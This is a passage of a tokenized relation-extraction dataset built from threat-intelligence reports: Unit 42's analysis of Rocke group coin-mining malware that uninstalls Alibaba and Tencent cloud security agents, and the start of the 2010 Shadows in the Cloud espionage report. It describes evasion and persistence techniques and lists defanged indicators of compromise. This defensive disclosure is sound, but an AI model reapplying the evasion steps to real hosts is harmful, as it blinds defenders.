{"r": "P27", "h": 38, "t": 36, "evidence": [44, 49]}, {"r": "P17", "h": 40, "t": 37, "evidence": [48, 49]}, {"r": "P17", "h": 34, "t": 37, "evidence": [43, 48]}, {"r": "P17", "h": 39, "t": 41, "evidence": [49, 54]}, {"r": "P17", "h": 39, "t": 42, "evidence": [49, 56]}, {"r": "P17", "h": 39, "t": 43, "evidence": [49, 58]}, {"r": "P17", "h": 40, "t": 44, "evidence": [49, 60]}, {"r": "P17", "h": 40, "t": 45, "evidence": [49, 62]}, {"r": "P27", "h": 46, "t": 47, "evidence": [63, 64]}, {"r": "P27", "h": 46, "t": 51, "evidence": [63, 67]}, {"r": "P27", "h": 52, "t": 53, "evidence": [69]}, {"r": "P17", "h": 49, "t": 45, "evidence": [62, 65]}], "title": "201901RockeGroupXbash", "sents": [["Malware", "Used", "by", "\u201c", "Rocke", "\u201d", "Group", "Evolves", "to", "Evade", "Detection", "by", "Cloud", "Security", "Products"], ["unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/"], ["By", "Xingyu", "Jin", "and", "Claud", "Xiao", "January", "17", ",", "2019", "Palo", "Alto", "Networks", "Unit", "42", "recently", "captured", "and", "investigated", "new", "samples", "of", "the", "Linux", "coin", "mining", "malware", "used", "by", "the", "Rocke", "group", "."], ["The", "family", "was", "suspected", "to", "be", "developed", "by", "the", "Iron", "cybercrime", "group", "and", "it", "\u2019s", "also", "associated", "with", "the", "Xbash", "malware", "we", "reported", "on", "in", "September", "of", "2018", "."], ["The", "threat", "actor", "Rocke", "was", "originally", "revealed", "by", "Talos", "in", "August", "of", "2018", "and", "many", "remarkable", "behaviors", "were", "disclosed", "in", "their", "blog", "post", "."], ["The", "samples", "described", "in", "this", "report", "were", "collected", "in", "October", "of", "2018", ",", "and", "since", "that", "time", "the", "command", "and", "control", "servers", "they", "use", "have", "been", "shut", "down", "."], ["During", "our", "analysis", ",", "we", "realized", "that", "these", "samples", "used", "by", "the", "Rocke", "group", "adopted", "new", "code", "to", "uninstall", "five", "different", "cloud", "security", "protection", "and", "monitoring", "products", "from", "compromised", "Linux", "servers", "."], ["In", "our", "analysis", ",", "these", "attacks", "did", "not", "compromise", "these", "security", "products", ":", "rather", ",", "the", "attacks", "first", "gained", "full", "administrative", "control", "over", "the", "hosts", "and", "then", "abused", "that", "full", "administrative", "control", "to", "uninstall", "these", "products", "in", "the", "same", "way", "a", "legitimate", "administrator", "would", "."], ["These", "products", "were", "developed", "by", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "(", "Aliyun", ")", ",", "the", "two", "leading", "cloud", "providers", "in", "China", "that", "are", "expanding", "their", "business", "globally", "."], ["To", "the", "best", "of", "our", "knowledge", ",", "this", "is", "the", "first", "malware", "family", "that", "developed", "the", "unique", "capability", "to", "target", "and", "remove", "cloud", "security", "products", "."], ["This", "also", "highlights", "a", "new", "challenge", "for", "products", "in", "the", "Cloud", "Workload", "Protection", "Platforms", "market", "defined", "by", "Gartner", "."], ["Technical", "Details"], ["The", "Coin", "Miner", "used", "by", "Rocke", "Group"], ["The", "threat", "actor", "Rocke", "was", "first", "reported", "by", "Cisco", "Talos", "in", "late", "July", "2018", "."], ["The", "ultimate", "goal", "of", "this", "threat", "is", "to", "mine", "Monero", "cryptocurrency", "in", "compromised", "Linux", "machines", "."], ["To", "deliver", "the", "malware", "to", "the", "victim", "machines", ",", "the", "Rocke", "group", "exploits", "vulnerabilities", "in", "Apache", "Struts", "2", ",", "Oracle", "WebLogic", ",", "and", "Adobe", "ColdFusion", "."], ["For", "example", ",", "by", "exploiting", "Oracle", "WebLogic", "vulnerability", "CVE-2017", "-", "10271", "in", "Linux", "shown", "in", "Figure", "1", ",", "a", "compromised", "Linux", "victim", "machine", "downloads", "backdoor", "0720.bin", "and", "opens", "a", "shell", "."], ["Figure", "1", "."], ["Exploit", "CVE-2017", "-", "10271"], ["Once", "the", "C2", "connection", "is", "established", ",", "malware", "used", "by", "the", "Rocke", "group", "downloads", "shell", "script", "named", "as", "\u201c", "a7", "\u201d", "to", "the", "victim", "machine", "."], ["The", "behaviors", "of", "a7", "include", ":", "Achieve", "persistence", "through", "cronjobs"], ["Kill", "other", "crypto", "mining", "processes", "1/6", "Add", "iptables", "rules", "to", "block", "other", "crypto", "mining", "malware"], ["Uninstall", "agent", "-", "based", "cloud", "security", "products", "Download", "and", "run", "UPX", "packed", "coin", "miner", "from", "blog[.]sydwzl[.]cn"], ["Hide", "process", "from", "Linux", "ps", "command", "by", "using", "the", "open", "source", "tool", "\u201c", "libprocesshider", "\u201d", "with", "LD_PRELOAD", "trick"], ["Adjust", "malicious", "file", "date", "time"], ["Cloud", "Workload", "Protection", "Platforms"], ["According", "to", "Gartner", ",", "Cloud", "Workload", "Protection", "Platforms", "(", "CWPPs", ")", "are", "the", "agent", "-", "based", "workload", "-", "centric", "security", "protection", "solutions", "."], ["To", "mitigate", "the", "impact", "of", "malware", "intrusion", "in", "public", "cloud", "infrastructure", ",", "cloud", "service", "providers", "develop", "their", "own", "CWPPs", "as", "the", "server", "security", "operation", "and", "management", "products", "."], ["For", "example", ",", "Tencent", "Cloud", "offers", "Tencent", "Host", "Security", "(", "HS", ",", "aka", "YunJing\u4e91\u955c", ")", "with", "various", "security", "protection", "services", "."], ["According", "to", "its", "\u201c", "Product", "Overview", "\u201d", "document", ",", "Tencent", "Host", "Security", "provides", "key", "security", "features", "like", "trojan", "detection", "and", "removal", "based", "on", "machine", "learning", ",", "password", "cracking", "alert", ",", "logging", "activity", "audit", ",", "vulnerability", "management", ",", "and", "asset", "management", "as", "shown", "in", "Figure", "2", "."], ["Figure", "2", "."], ["Tencent", "Host", "Security", "Key", "Features", "Alibaba", "Cloud", "(", "Aliyun", ")", "also", "offers", "a", "cloud", "security", "product", "called", "Threat", "Detection", "Service", "(", "TDS", ",", "aka", "Aegis", "\u5b89\u9a91\u58eb", ")", "."], ["Alibaba", "Cloud", "Threat", "Detection", "Service", "provides", "security", "services", "like", "malware", "scanning", "and", "removal", ",", "vulnerability", "management", ",", "log", "analysis", ",", "and", "threat", "analysis", "based", "on", "big", "data", "."], ["Third", "-", "party", "cybersecurity", "companies", "also", "provide", "CWPPs", "."], ["For", "instance", ",", "Trend", "Micro", ",", "Symantec", ",", "and", "Microsoft", "have", "their", "own", "cloud", "security", "products", "for", "public", "cloud", "infrastructure", "."], ["As", "with", "all", "security", "products", ",", "adversaries", "inevitably", "work", "to", "evade", "these", "systems", "to", "be", "able", "to", "achieve", "their", "ultimate", "goals", "."], ["Evading", "Detection", "from", "Cloud", "Workload", "Protection", "Platforms", "2/6"], ["In", "response", "to", "agent", "-", "based", "Cloud", "Workload", "Protection", "Platforms", "from", "cloud", "service", "providers", ",", "malware", "used", "by", "the", "Rocke", "group", "gradually", "developed", "the", "capability", "to", "evade", "detection", "before", "exhibiting", "any", "malicious", "behaviors", "."], ["To", "be", "more", "specific", ",", "the", "malware", "uninstalls", "cloud", "security", "products", "by", "Alibaba", "Cloud", "and", "Tencent", "Cloud", "."], ["In", "the", "early", "version", "of", "the", "malware", "used", "by", "Rocke", ",", "it", "only", "attempts", "to", "kill", "Tencent", "Cloud", "Monitor", "process", "as", "shown", "in", "Figure", "3", "."], ["Figure", "3", "."], ["Malware", "kills", "Tencent", "Cloud", "Monitor", "process"], ["Realizing", "that", "killing", "the", "cloud", "monitor", "service", "alone", "is", "not", "enough", "to", "evade", "detection", "by", "agent", "-", "based", "cloud", "security", "products", ",", "the", "malware", "authors", "continued", "developing", "more", "effective", "methods", "to", "evade", "detection", "by", "killing", "more", "agentbased", "cloud", "security", "services", "."], ["The", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "official", "websites", "provide", "documents", "to", "guide", "users", "about", "how", "to", "uninstall", "their", "cloud", "security", "products", "."], ["The", "document", "for", "uninstalling", "Alibaba", "Threat", "Detection", "Service", "is", "shown", "in", "Figure", "4", "."], ["Figure", "4", "."], ["Official", "guide", "for", "uninstalling", "Alibaba", "Threat", "Detection", "Service"], ["The", "document", "for", "uninstalling", "Tencent", "Cloud", "Host", "Security", "is", "shown", "in", "Figure", "5", ".", "3/6", "Figure", "5", "."], ["Official", "guide", "for", "uninstalling", "Tencent", "Cloud", "Host", "Security", "Product"], ["The", "malware", "used", "by", "the", "Rocke", "group", "follows", "the", "uninstallation", "procedure", "provided", "by", "Alibaba", "Cloud", "and", "Tencent", "Cloud", "as", "well", "as", "some", "random", "blog", "posts", "on", "the", "Internet", "."], ["The", "key", "uninstall", "function", "is", "shown", "in", "Figure", "6", "."], ["Figure", "6", "."], ["Key", "function", "for", "malware", "to", "evade", "detection"], ["This", "function", "can", "uninstall", ":", "1", "."], ["Alibaba", "Threat", "Detection", "Service", "agent", "."], ["2", "."], ["Alibaba", "CloudMonitor", "agent", "(", "Monitor", "CPU", "&", "memory", "consumption", ",", "network", "connectivity", ")", "."], ["3", "."], ["Alibaba", "Cloud", "Assistant", "agent", "(", "tool", "for", "automatically", "managing", "instances", ")", "."], ["4/6", "4", "."], ["Tencent", "Host", "Security", "agent", "."], ["5", "."], ["Tencent", "Cloud", "Monitor", "agent", "."], ["After", "agent", "-", "based", "cloud", "security", "and", "monitor", "products", "are", "uninstalled", ",", "the", "malware", "used", "by", "the", "Rocke", "group", "begins", "to", "exhibit", "malicious", "behaviors", "."], ["We", "believe", "this", "unique", "evasion", "behavior", "will", "be", "the", "new", "trend", "for", "malware", "which", "targets", "public", "cloud", "infrastructure", "."], ["Mitigations", "Palo", "Alto", "Networks", "Unit", "42", "has", "been", "cooperating", "with", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "to", "address", "the", "malware", "evasion", "problem", "and", "its", "C2", "infrastructure", "."], ["Additionally", ",", "the", "malicious", "C2", "domains", "are", "identified", "by", "our", "PAN", "-", "DB", "URL", "Filtering", "."], ["Conclusion", "Public", "cloud", "infrastructure", "is", "one", "of", "the", "main", "targets", "for", "this", "cybercrime", "group", "."], ["Realizing", "the", "existing", "cloud", "monitor", "and", "security", "products", "may", "detect", "the", "possible", "malware", "intrusion", ",", "malware", "authors", "continue", "to", "create", "new", "evasion", "technologies", "to", "avoid", "being", "detected", "by", "cloud", "security", "product", "."], ["The", "variant", "of", "the", "malware", "used", "by", "the", "Rocke", "group", "is", "an", "example", "that", "demonstrates", "that", "the", "agent", "-", "based", "cloud", "security", "solution", "may", "not", "be", "enough", "to", "prevent", "evasive", "malware", "targeted", "at", "public", "cloud", "infrastructure", "."], ["Indicators", "of", "Compromise"], ["Samples", "with", "the", "evasion", "behavior"], ["2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4"], ["2f603054dda69c2ac1e49c916ea4a4b1ae6961ec3c01d65f16929d445a564355", "28ea5d2e44538cd7fec11a28cce7c86fe208b2e8f53d57bf8a18957adb90c5ab", "232c771f38da79d5b8f7c6c57ddb4f7a8d6d44f8bca41be4407ed4923096c700"], ["893bdc6b7d2d7134b1ceb5445dbb97ad9c731a427490d59f6858a835525d8417", "9300f1aa56a73887d05672bfb9862bd786230142c949732c208e5e019d14f83a", "27611b92d31289d023d962d3eb7c6abd194dbdbbe4e6977c42d94883553841e8", "d341e3a9133e534ca35d5ccc54b8a79f93ff0c917790e7d5f73fedaa480a6b93", "ed038e9ea922af9f0bf5e8be42b394650fa808982d5d555e6c50c715ff2cca0c", "4b74c4d66387c70658238ac5ab392e2fe5557f98fe09eadda9259ada0d87c0f1", "e391963f496ba056e9a9f750cbd28ca7a08ac4cfc434bee4fc57a292b11941e6", "017dee32e287f37a82cf6e249f8a85b5c9d4f090e5452118ccacaf147e88dc66", "Domains", "for", "C2", "Communication", "dwn[.]rundll32[.]ml", "www[.]aybc[.]so", "a[.]ssvs[.]space", "sydwzl[.]cn", "IPs", "for", "C2", "Communication", "118.24.150[.]172", "(", "on", "Tencent", "Cloud", ")"], ["120.55.54[.]65", "(", "on", "Alibaba", "Cloud", ")"], ["URLs", "for", "Code", "Update", "5/6", "hxxps://pastebin[.]com", "/", "raw", "/", "CnPtQ2tM", "hxxps://pastebin[.]com", "/", "raw", "/", "rjPGgXQE", "hxxps://pastebin[.]com", "/", "raw/1NtRkBc3"], ["hxxps://pastebin[.]com", "/", "raw", "/", "tRxfvbYN", "hxxps://pastebin[.]com", "/", "raw", "/", "SSCy7mY7"], ["hxxps://pastebin[.]com", "/", "raw", "/", "VVt27LeH", "hxxps://pastebin[.]com", "/", "raw", "/", "Fj2YdETv", "hxxps://pastebin[.]com", "/", "raw", "/", "JNPewK6r"], ["hxxps://pastebin[.]com", "/", "raw", "/", "TzBeq3AM", "hxxps://pastebin[.]com", "/", "raw", "/", "eRkrSQfE", "hxxps://pastebin[.]com", "/", "raw/5bjpjvLP"], ["hxxps://pastebin[.]com", "/", "raw", "/", "Gw7mywhC"], ["XMR", "Wallet", "Address", "42im1KxfTw2Sxa716eKkQAcJpS6cwqkGaHHGnnUAcdDhG2NJhqEF1nNRwjkBsYDJQtDkLCTPehfDC4zjMy5hefT81Xk2h7V.v7", "6/6"]]}, {"vertexSet": [[{"name": "India", "pos": [39, 40], "sent_id": 58, "type": "Country"}], [{"name": "Offices of the Dalai Lama", "pos": [42, 47], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "United Nations", "pos": [49, 51], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Chengdu", "pos": [20, 21], "sent_id": 63, "type": "Location"}]], "labels": [], "title": "shadows-in-the-cloud", "sents": [["JR03", "-", "2010", "SHADOWS", "IN", "THE", "CLOUD", ":"], ["Investigating", "Cyber", "Espionage", "2.0", "JOINT", "REPORT", ":"], ["Information", "Warfare", "Monitor"], ["Shadowserver", "Foundation", "April", "6", ",", "2010", "WEB", "VERSION", "."], ["Also", "found", "here", ":", "http://shadows-in-the-cloud.net", "INFOWAR", "MONITOR", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "FOREWORD", "I", "Foreword"], ["Crime", "and", "espionage", "form", "a", "dark", "underworld", "of", "cyberspace", "."], ["Whereas", "crime", "is", "usually", "the", "first", "to", "seek", "out", "new", "opportunities", "and", "methods", ",", "espionage", "usually", "follows", "in", "its", "wake", ",", "borrowing", "techniques", "and", "tradecraft", "."], ["The", "Shadows", "in", "the", "Cloud", "report", "illustrates", "the", "increasingly", "dangerous", "ecosystem", "of", "crime", "and", "espionage", "and", "its", "embeddedness", "in", "the", "fabric", "of", "global", "cyberspace", "."], ["This", "ecosystem", "is", "the", "product", "of", "numerous", "factors", "."], ["Attackers", "employ", "complex", ",", "adaptive", "attack", "techniques", "that", "demonstrate", "high", "-", "level", "ingenuity", "and", "opportunism", "."], ["They", "take", "advantage", "of", "the", "cracks", "and", "fissures", "that", "open", "up", "in", "the", "fast", "-", "paced", "transformations", "of", "our", "technological", "world", "."], ["Every", "new", "software", "program", ",", "social", "networking", "site", ",", "cloud", "computing", ",", "or", "cheap", "hosting", "service", "that", "is", "launched", "into", "our", "everyday", "digital", "lives", "creates", "an", "opportunity", "for", "this", "ecosystem", "to", "morph", ",", "adapt", ",", "and", "exploit", "."], ["It", "has", "also", "emerged", "because", "of", "poor", "security", "practices", "of", "users", ",", "from", "individuals", "to", "large", "organizations", "."], ["We", "take", "for", "granted", "that", "the", "information", "and", "communications", "revolution", "is", "a", "relatively", "new", "phenomenon", ",", "still", "very", "much", "in", "the", "midst", "of", "unceasing", "epochal", "change", "."], ["Public", "institutions", "have", "adopted", "these", "new", "technologies", "faster", "than", "procedures", "and", "rules", "have", "been", "created", "to", "deal", "with", "the", "radical", "transparency", "and", "accompanying", "vulnerabilities", "they", "introduce", "."], ["Today", ",", "data", "is", "transferred", "from", "laptops", "to", "USB", "sticks", ",", "over", "wireless", "networks", "at", "caf\u00e9", "hot", "spots", ",", "and", "stored", "across", "cloud", "computing", "services", "whose", "servers", "are", "located", "in", "far", "-", "off", "political", "jurisdictions", "."], ["These", "new", "modalities", "of", "communicating", "de", "-", "concentrate", "and", "disperse", "the", "targets", "of", "exploitation", ",", "multiplying", "the", "points", "of", "exposure", "and", "potential", "compromise", "."], ["Paradoxically", ",", "documents", "and", "data", "are", "probably", "safer", "in", "a", "file", "cabinet", ",", "behind", "the", "bureaucrat", "\u2019s", "careful", "watch", ",", "than", "they", "are", "on", "the", "PC", "today", "."], ["The", "ecosystem", "of", "crime", "and", "espionage", "is", "also", "emerging", "because", "of", "opportunism", "on", "the", "part", "of", "actors", "."], ["Cyber", "espionage", "is", "the", "great", "equalizer", "."], ["Countries", "no", "longer", "have", "to", "spend", "billions", "of", "dollars", "to", "build", "globe", "-", "spanning", "satellites", "to", "pursue", "high", "-", "level", "intelligence", "gathering", ",", "when", "they", "can", "do", "so", "via", "the", "web", "."], ["We", "have", "no", "evidence", "in"], ["this", "report", "of", "the", "involvement", "of", "the", "People", "\u2019s", "Republic", "of", "China", "(", "PRC", ")", "or", "any", "other", "government", "in", "the", "Shadow", "network", "."], ["But", "an", "important", "question", "to", "be", "entertained", "is", "whether", "the", "PRC", "will", "take", "action", "to", "shut", "the", "Shadow", "network", "down", "."], ["Doing", "so", "will", "help", "to", "address", "long", "-", "standing", "concerns", "that", "malware", "ecosystems", "are", "actively", "cultivated", ",", "or", "at", "the", "very", "least", "tolerated", ",", "by", "governments", "like", "the", "PRC", "who", "stand", "to", "benefit", "from", "their", "exploits", "though", "the", "black", "and", "grey", "markets", "for", "information", "and", "data", "."], ["Finally", ",", "the", "ecosystem", "is", "emerging", "because", "of", "a", "propitious", "policy", "environment", "\u2014", "or", "rather", "the", "absence", "of", "one", "\u2014", "at", "a", "global", "level", "."], ["Governments", "around", "the", "world", "are", "engaged", "in", "a", "rapid", "race", "to", "militarize", "cyber", "space", ",", "to", "develop", "tools", "and", "methods", "to", "fight", "and", "win", "wars", "in", "this", "domain", "."], ["This", "arms", "race", "creates", "an", "opportunity", "structure", "ripe", "for", "crime", "and", "espionage", "to", "flourish", "."], ["In", "the", "absence", "of", "norms", ",", "principles", "and", "rules", "of", "mutual", "restraint", "at", "a", "global", "level", ",", "a", "vacuum", "exists", "for", "subterranean", "exploits", "to", "fill", "."], ["There", "is", "a", "real", "risk", "of", "a", "perfect", "storm", "in", "cyberspace", "erupting", "out", "of", "this", "vacuum", "that", "threatens", "to", "subvert", "cyberspace", "itself", ",", "either", "through", "over", "-", "reaction", ",", "a", "spiraling", "arms", "race", ",", "the", "imposition", "of", "heavy", "-", "handed", "controls", ",", "or", "through", "gradual", "irrelevance", "as", "people", "disconnect", "out", "of", "fear", "of", "insecurity", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "FOREWORD"], ["II", "There", "is", ",", "therefore", ",", "an", "urgent", "need", "for", "a", "global", "convention", "on", "cyberspace", "that", "builds", "robust", "mechanisms", "of", "information", "sharing", "across", "borders", "and", "institutions", ",", "defines", "appropriate", "rules", "of", "the", "road", "for", "engagement", "in", "the", "cyber", "domain", ",", "puts", "the", "onus", "on", "states", "to", "not", "tolerate", "or", "encourage", "mischievous", "networks", "whose", "activities", "operate", "from", "within", "their", "jurisdictions", ",", "and", "protects", "and", "preserves", "this", "valuable", "global", "commons", "."], ["Until", "such", "a", "normative", "and", "policy", "shift", "occurs", ",", "the", "shadows", "in", "the", "cloud", "may", "grow", "into", "a", "dark", ",", "threatening", "storm", "."], ["Ron", "Deibert", "Director", ",", "the", "Citizen", "Lab", ",", "Munk", "School", "of", "Global", "Affairs"], ["University", "of", "Toronto", "Rafal", "Rohozinski", "CEO", ",", "The", "SecDev", "Group", "(", "Ottawa", ")"], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "ACKNOWLEDGMENTS", "III", "Acknowledgments"], ["This", "investigation", "is", "a", "result", "of", "a", "collaboration", "between", "the", "Information", "Warfare", "Monitor", "and", "the", "Shadowserver", "Foundation", "."], ["Our", "ability", "to", "share", "critical", "information", "and", "analytical", "insights", "within", "a", "dedicated", "group", "of", "professionals", "allowed", "us", "to", "uncover", "and", "investigate", "the", "operation", "of", "the", "network", "documented", "in", "this", "report", "."], ["The", "Information", "Warfare", "Monitor", "(", "infowar-monitor.net", ")", "is", "a", "joint", "activity", "of", "the", "Citizen", "Lab", ",", "Munk", "School", "of", "Global", "Affairs", ",", "University", "of", "Toronto", ",", "and", "the", "SecDev", "Group", ",", "an", "operational", "consultancy", "based", "in", "Ottawa", "specialising", "in", "evidence", "-", "based", "research", "in", "countries", "and", "regions", "under", "threat", "of", "insecurity", "and", "violence", "."], ["The", "Shadowserver", "Foundation", "(", "shadowserver.org", ")", "was", "established", "in", "2004", "and", "is", "comprised", "of", "volunteer", "security", "professionals", "that", "investigate", "and", "monitor", "malware", ",", "botnets", ",", "and", "malicious", "attacks", "."], ["Both", "the", "Information", "Warfare", "Monitor", "and", "the", "Shadowserver", "Foundation", "aim", "to", "understand", "and", "accurately", "report", "on", "emerging", "cyber", "threats", "as", "they", "develop", "."], ["Steven", "Adair", "is", "a", "security", "researcher", "with", "the", "Shadowserver", "Foundation", "."], ["He", "frequently", "analyzes", "malware", ",", "tracks", "botnets", ",", "and", "deals", "with", "cyber", "attacks", "of", "all", "kinds", "with", "a", "special", "emphasis", "on", "those", "linked", "to", "cyber", "espionage", "."], ["Ron", "Deibert", "is", "Director", "of", "the", "Citizen", "Lab", "at", "the", "Munk", "School", "of", "Global", "Affairs", ",", "University", "of", "Toronto", "."], ["He", "is", "a", "co", "-", "founder", "and", "principal", "investigator", "of", "the", "OpenNet", "Initiative", "and", "Information", "Warfare", "Monitor", "."], ["He", "is", "Vice", "President", ",", "Policy", "and", "Outreach", ",", "Psiphon", "Inc.", ",", "and", "a", "principal", "with", "the", "SecDev", "Group", "."], ["Rafal", "Rohozinski", "is", "CEO", "of", "the", "SecDev", "Group", "and", "Psiphon", "Inc."], ["He", "is", "a", "co", "-", "founder", "and", "principal", "investigator", "of", "the", "OpenNet", "Initiative", "and", "Information", "Warfare", "Monitor", ",", "and", "a", "senior", "research", "advisor", "at", "the", "Citizen", "Lab", ",", "Munk", "School", "of", "Global", "Affairs", ",", "University", "of", "Toronto", "."], ["Nart", "Villeneuve", "is", "the", "Chief", "Security", "Officer", "at", "the", "SecDev", "Group", ",", "Director", "of", "Operations", "of", "Psiphon", "Inc.", "and", "a", "senior", "SecDev", "research", "fellow", "at", "the", "Citizen", "Lab", "at", "the", "Munk", "School", "of", "Global", "Affairs", ",", "University", "of", "Toronto", "where", "he", "focuses", "on", "electronic", "surveillance", ",", "targeted", "malware", "and", "politically", "motivated", "digital", "attacks", "."], ["Greg", "Walton", "conducted", "and", "coordinated", "the", "primary", "field", "-", "based", "research", "for", "the", "Shadow", "investigation", "in", "His", "Holiness", "the", "Dalai", "Lama", "\u2019s", "Office", "and", "the", "Tibetan", "Government", "-", "in", "-", "Exile", "in", "Dharamsala", ",", "India", "."], ["Greg", "is", "a", "SecDev", "Group", "associate", "and", "editor", "of", "the", "Information", "Warfare", "Monitor", "website", "."], ["He", "is", "the", "SecDev", "Fellow", "at", "the", "Citizen", "Lab", "at", "the", "Munk", "School", "of", "Global", "Affairs", ",", "University", "of", "Toronto", "."], ["This", "report", "represents", "a", "collective", "activity", "and", "numerous", "others", "also", "contributed", "to", "the", "research", "effort", "."], ["This", "includes", "individuals", "in", "India", ",", "who", "for", "security", "reasons", "we", "can", "not", "name", "."], ["We", "are", "also", "grateful", "to", "the", "Office", "of", "His", "Holiness", "the", "Dalai", "Lama", "."], ["The", "research", "of", "the", "Citizen", "Lab", "and", "the", "Information", "Warfare", "Monitor", "is", "supported", "by", "a", "generous", "grant", "from", "the", "John", "D.", "and", "Catherine", "T.", "MacArthur", "Foundation", ",", "in", "-", "kind", "and", "staff", "contributions", "from", "the", "SecDev", "Group", ",", "and", "a", "generous", "donation", "of", "software", "from"], ["Palantir", "Technologies", "Inc."], ["We", "are", "very", "grateful", "to", "Masashi", "Crete", "-", "Nishihata", "(", "Citizen", "Lab", ")", "and", "Arnav", "Manchanda", "(", "SecDev", "Group", ")", "for", "research", "assistance", ",", "and", "to", "Jane", "Gowan", "(", "Agent", "5", "Design", "and", "Citizen", "Lab", ")", "for", "layout", "and", "design", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "EXECUTIVE", "SUMMARY", "IV", "Executive", "Summary", "Shadows", "in", "the", "Cloud", "documents", "a", "complex", "ecosystem", "of", "cyber", "espionage", "that", "systematically", "compromised", "government", ",", "business", ",", "academic", ",", "and", "other", "computer", "network", "systems", "in", "India", ",", "the", "Offices", "of", "the", "Dalai", "Lama", ",", "the", "United", "Nations", ",", "and", "several", "other", "countries", "."], ["The", "report", "also", "contains", "an", "analysis", "of", "data", "which", "were", "stolen", "from", "politically", "sensitive", "targets", "and", "recovered", "during", "the", "course", "of", "the", "investigation", "."], ["These", "include", "documents", "from", "the", "Offices", "of", "the", "Dalai", "Lama", "and", "agencies", "of", "the", "Indian", "national", "security", "establishment", "."], ["Data", "containing", "sensitive", "information", "on", "citizens", "of", "numerous", "third", "-", "party", "countries", ",", "as", "well", "as", "personal", ",", "financial", ",", "and", "business", "information", ",", "were", "also", "exfiltrated", "and", "recovered", "during", "the", "course", "of", "the", "investigation", "."], ["The", "report", "analyzes", "the", "malware", "ecosystem", "employed", "by", "the", "Shadows", "\u2019", "attackers", ",", "which", "leveraged", "multiple", "redundant", "cloud", "computing", "systems", ",", "social", "networking", "platforms", ",", "and", "free", "web", "hosting", "services", "in", "order", "to", "maintain", "persistent", "control", "while", "operating", "core", "servers", "located", "in", "the", "People", "\u2019s", "Republic", "of", "China", "(", "PRC", ")", "."], ["Although", "the", "identity", "and", "motivation", "of", "the", "attackers", "remain", "unknown", ",", "the", "report", "is", "able", "to", "determine", "the", "location", "(", "Chengdu", ",", "PRC", ")", "as", "well", "as", "some", "of", "the", "associations", "of", "the", "attackers", "through", "circumstantial", "evidence", "."], ["The", "investigation", "is", "the", "product", "of", "an", "eight", "month", ",", "collaborative", "activity", "between", "the", "Information", "Warfare", "Monitor", "(", "Citizen", "Lab", "and", "SecDev", ")", "and", "the", "Shadowserver", "Foundation", "."], ["The", "investigation", "employed", "a", "fusion", "methodology", ",", "combining", "technical", "interrogation", "techniques", ",", "data", "analysis", ",", "and", "field", "research", ",", "to", "track", "and", "uncover", "the", "Shadow", "cyber", "espionage", "network", "."], ["Summary", "of", "Main", "Findings"], ["\u0083\u0083", "Complex", "cyber", "espionage", "network", "-", "Documented", "evidence", "of", "a", "cyber", "espionage", "network", "that", "compromised", "government", ",", "business", ",", "and", "academic", "computer", "systems", "in", "India", ",", "the", "Office", "of", "the", "Dalai", "Lama", ",", "and", "the", "United", "Nations", "."], ["Numerous", "other", "institutions", ",", "including", "the", "Embassy", "of", "Pakistan", "in", "the", "United", "States", ",", "were", "also", "compromised", "."], ["Some", "of", "these", "institutions", "can", "be", "positively", "identified", ",", "while", "others", "can", "not", "."], ["\u0083\u0083"], ["Theft", "of", "classified", "and", "sensitive", "documents", "-", "Recovery", "and", "analysis", "of", "exfiltrated", "data", ",", "including", "one", "document", "that", "appears", "to", "be", "encrypted", "diplomatic", "correspondence", ",", "two", "documents", "marked", "\u201c", "SECRET", "\u201d", ",", "six", "as", "\u201c", "RESTRICTED", "\u201d", ",", "and", "five", "as", "\u201c", "CONFIDENTIAL", "\u201d", "."], ["These", "documents", "are", "identified", "as", "belonging", "to", "the", "Indian", "government", "."], ["However", ",", "we", "do", "not", "have", "direct", "evidence", "that", "they", "were", "stolen", "from", "Indian", "government", "computers", "and", "they", "may", "have", "been", "compromised", "as", "a", "result", "of", "being", "copied", "onto", "personal", "computers", "."], ["The", "recovered", "documents", "also", "include", "1,500", "letters", "sent", "from", "the", "Dalai", "Lama", "\u2019s", "office", "between", "January", "and", "November", "2009", "."], ["The", "profile", "of", "documents", "recovered", "suggests", "that", "the", "attackers", "targeted", "specific", "systems", "and", "profiles", "of", "users", "."], ["\u0083\u0083", "Evidence", "of", "collateral", "compromise", "-", "A", "portion", "of", "the", "recovered", "data", "included", "visa", "applications", "submitted", "to", "Indian", "diplomatic", "missions", "in", "Afghanistan", "."], ["This", "data", "was", "voluntarily", "provided", "to", "the", "Indian", "missions", "by", "nationals", "of", "13", "countries", "as", "part", "of", "the", "regular", "visa", "application", "process", "."], ["In", "a", "context", "like", "Afghanistan", ",", "this", "finding", "points", "to", "the", "complex", "nature", "of", "the", "information", "security", "challenge", "where", "risks", "to", "individuals", "(", "or", "operational", "security", ")", "can", "occur", "as", "a", "result", "of", "a", "data", "compromise", "on", "secure", "systems", "operated", "by", "trusted", "partners", "."], ["\u0083\u0083", "Command", "-", "and", "-", "control", "infrastructure", "that", "leverages", "cloud", "-", "based", "social", "media", "services", "-", "Documentation", "of", "a", "complex", "and", "tiered", "command", "and", "control", "infrastructure", ",", "designed", "to", "maintain", "persistence", "."], ["The", "infrastructure", "made", "use", "of", "freely", "available", "social", "media", "systems", "that", "include", "Twitter", ",", "Google", "Groups", ",", "Blogspot", ",", "Baidu", "Blogs", ",", "blog.com", "and", "Yahoo", "!"], ["Mail", "."], ["This", "top", "layer", "directed", "compromised", "computers", "to", "accounts", "on", "free", "web", "hosting", "services", ",", "and", "as", "the", "free", "hosting", "servers", "were", "disabled", ",", "to", "a", "stable", "core", "of", "command", "and", "control", "servers", "located", "in", "the", "PRC", "."], ["\u0083\u0083", "Links", "to", "Chinese", "hacking", "community", "-", "Evidence", "of", "links", "between", "the", "Shadow", "network", "and", "two", "individuals", "living", "in", "Chengdu", ",", "PRC", "to", "the", "underground", "hacking", "community", "in", "the", "PRC", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "TABLE", "OF", "CONTENTS", "Table", "of", "Contents"], 